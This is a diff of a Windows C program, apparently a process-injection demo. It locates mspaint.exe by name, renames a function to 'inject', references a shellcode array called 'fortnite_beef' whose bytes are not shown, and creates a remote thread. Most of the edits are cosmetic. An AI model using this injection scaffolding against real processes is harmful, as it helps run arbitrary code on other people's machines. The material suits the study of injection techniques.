@@ -3,21 +3,21 @@
 #include <stdio.h>
 
 #define DECOR() printf("==================================================================\n")
-#define INFO(MSG, ...) printf("[HI] "  MSG  "\n", ##__VA_ARGS__)
-#define GOOD(MSG, ...) printf("[W]"  MSG  "\n", ##__VA_ARGS__)
-#define BAD(MSG, ...) printf("[L]"  MSG  "\n", ##__VA_ARGS__)
+#define INFO(MSG, ...) printf("[-_-] "  MSG  "\n", ##__VA_ARGS__)
+#define GOOD(MSG, ...) printf("[^_^]"  MSG  "\n", ##__VA_ARGS__)
+#define BAD(MSG, ...) printf("[>:(]"  MSG  "\n", ##__VA_ARGS__)
 #define ERR(MSG, ...) {	DECOR();				          \
-			fprintf(stderr,				         		  \
+			fprintf(stderr,				      	  \
 	      	      		"[EEK] "  MSG "\n"		       	  \
 				"[EEK] ERROR CODE:      0x%ld\n"          \
-				"[EEK] FUNCTION:        %s()\n" 	      \
+				"[EEK] FUNCTION:        %s()\n" 	  \
 				"[EEK] LINE: 	       %ld\n",            \
 				GetLastError(),__func__,__LINE__);     	  \
-				DECOR();					              \
-		    }
+				DECOR();			          \
+		      }
 
 DWORD getPID(_In_ const char* processName);
-HANDLE work(_In_ DWORD PID);
+HANDLE inject(_In_ DWORD PID);
 VOID CleanHandleWait(
 		_In_ HANDLE hProcess,
 		_In_ HANDLE hThread
@@ -25,7 +25,6 @@ VOID CleanHandleWait(
 
 int main(void)
 {
-
 	DWORD PID = getPID("mspaint.exe");
 	if(PID == -1)
 	{
@@ -33,7 +32,7 @@ int main(void)
 	}
 
 	INFO("PID: %lu",PID);
-	work(PID);
+	inject(PID);
 	INFO("END");
 
 	return EXIT_SUCCESS;
@@ -41,9 +40,8 @@ int main(void)
 
 DWORD getPID(_In_ const char* processName)
 {
-
 	HANDLE hProcessSnap = NULL;	//list of processes
-	PROCESSENTRY32  pe32;	//info of process
+	PROCESSENTRY32 pe32;	//info of process
 	
 	hProcessSnap = CreateToolhelp32Snapshot(
 			TH32CS_SNAPPROCESS, //snapshot Process flag
@@ -79,7 +77,7 @@ DWORD getPID(_In_ const char* processName)
 	return -1;
 }
 
-HANDLE work(_In_ DWORD PID)
+HANDLE inject(_In_ DWORD PID)
 {
 
 	//split into 2 lines (line1 + " " + line2)
@@ -189,7 +187,6 @@ unsigned char fortnite_beef[] =
 	}
 
 	GOOD("THREAD CREATED");
-
 	CleanHandleWait(hProcess,hThread);
 }
 
@@ -216,7 +213,6 @@ VOID CleanHandleWait(HANDLE hProcess, HANDLE hThread){
 		default:
 		ERR("UNKNOWN SIGNAL");
 	}
-
 }
 
 /**
